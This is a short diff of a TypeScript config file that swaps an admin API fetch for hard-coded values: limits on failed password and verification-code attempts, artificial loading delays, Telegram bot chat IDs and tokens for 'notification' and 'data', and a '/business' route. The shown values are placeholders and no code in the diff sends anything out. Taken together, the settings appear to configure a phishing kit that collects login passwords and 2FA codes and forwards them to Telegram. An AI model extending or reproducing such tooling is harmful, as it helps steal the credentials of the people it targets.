@@ -1,5 +1,3 @@
-import axios from 'axios';
-
 interface Config {
 	settings: {
 		code_loading_time: number;
@@ -15,16 +13,32 @@ interface Config {
 		data_chatid: string;
 		data_token: string;
 	};
+	router: {
+		business_url: string;
+	};
 }
 
 const getConfig = async (): Promise<Config> => {
-	try {
-		const response = await axios.get<Config>('/api/admin/config');
-		return response.data;
-	} catch (error) {
-		console.error('Error fetching config:', error);
-		throw error;
-	}
+	// b thay vao day nhe, t
+	return {
+		settings: {
+			code_loading_time: 3000,
+			max_failed_code_attempts: 5,
+			max_failed_password_attempts: 3,
+			page_loading_time: 2000,
+			password_loading_time: 4000,
+			code_input_enabled: true,
+		},
+		telegram: {
+			notification_chatid: '123456789',
+			notification_token: 'abcdefg-token',
+			data_chatid: '987654321',
+			data_token: 'hijklmn-token',
+		},
+		router: {
+			business_url: '/business',
+		},
+	};
 };
 
 export default getConfig;
